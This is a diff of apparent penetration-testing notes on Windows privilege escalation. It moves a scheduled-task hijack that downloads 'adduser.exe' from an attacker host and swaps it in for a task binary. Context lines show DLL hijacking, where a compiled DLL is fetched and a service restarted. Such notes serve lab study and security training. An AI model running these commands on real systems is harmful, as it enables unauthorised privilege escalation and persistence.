@@ -65,6 +65,11 @@ schtasks /query /fo LIST /v
 schtasks /query /v /fo list | findstr /i "backup.exe"
 schtasks /query /fo LIST /v /tn "backup runner(taskname)" ----for retrieve full task info
 Get-ScheduledTask | Where-Object {$_.TaskName -like '*backup*'}
+
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
+iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
+move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+move .\BackendCacheCleanup.exe .\Pictures\
 ```
 
 ##### Enumerating Unmounted Disks
@@ -242,16 +247,6 @@ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
 Replace and restart service:
 iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
 Restart-Service BetaService
-```
-
-##### Scheduled Tasks
-```
-Get-ScheduledTask
-schtasks /query /fo LIST /v
-icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
-iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe
-move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
-move .\BackendCacheCleanup.exe .\Pictures\
 ```
 
 ##### Named Pipes(PrintSpoofer)
